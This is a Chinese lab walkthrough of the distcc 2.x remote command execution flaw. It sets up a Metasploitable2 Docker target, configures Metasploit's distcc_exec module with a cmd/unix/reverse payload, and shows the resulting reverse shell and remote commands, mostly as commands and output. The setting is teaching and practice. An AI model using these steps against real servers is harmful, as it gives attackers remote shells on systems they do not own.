### 1、漏洞原理
```shell script
Distcc用于大量代码在网络服务器上的分布式编译，但是如果配置不严格，容易被滥用执行命令，
该漏洞是Xcode 1.5版本及其他版本的 distcc 2.x版本配置对于服务器端口的访问不限制
```
### 2、漏洞执行环境，需要暴露3632端口
```shell script
docker run --name my_metasploitable2 -it -p 3632:3632 tleemcjr/metasploitable2:latest sh -c "/bin/services.sh && bash"
```
```shell script
[root@target ~]# docker ps -a 
CONTAINER ID   IMAGE                             COMMAND                  CREATED          STATUS          PORTS                                                                                      NAMES
1ee9a0bb7e07   tleemcjr/metasploitable2:latest   "sh -c '/bin/service…"   15 seconds ago   Up 14 seconds   0.0.0.0:3632->3632/tcp, :::3632->3632/tcp  
```
### 3、查找漏洞框架
```shell script
msf6 exploit(unix/misc/distcc_exec) > search distcc

Matching Modules
================

   #  Name                           Disclosure Date  Rank       Check  Description
   -  ----                           ---------------  ----       -----  -----------
   0  exploit/unix/misc/distcc_exec  2002-02-01       excellent  Yes    DistCC Daemon Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/misc/distcc_exec
```
### 4、设置漏洞攻击参数
```shell script
use exploit/unix/misc/distcc_exec # 应用框架
set payload cmd/unix/reverse  # payload
set rhosts 172.16.120.252 # 攻击的ip地址
set lhost 172.16.120.177  # 本机的IP地址
```
![image](https://github.com/498946975/Security/blob/master/images/distcc_1.png)
### 5、攻击
```shell script
msf6 exploit(unix/misc/distcc_exec) > exploit      

[*] Started reverse TCP double handler on 172.16.120.177:4444 
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo saQgzyN6FyAwdIls;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "saQgzyN6FyAwdIls\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 2 opened (172.16.120.177:4444 -> 172.16.120.252:39488 ) at 2022-01-20 11:15:37 +0800

ls    # 远程执行命令
1582.jsvc_up
1823.jsvc_up
810.jsvc_up
815.jsvc_up
826.jsvc_up
pwd   # 远程执行命令
/tmp
```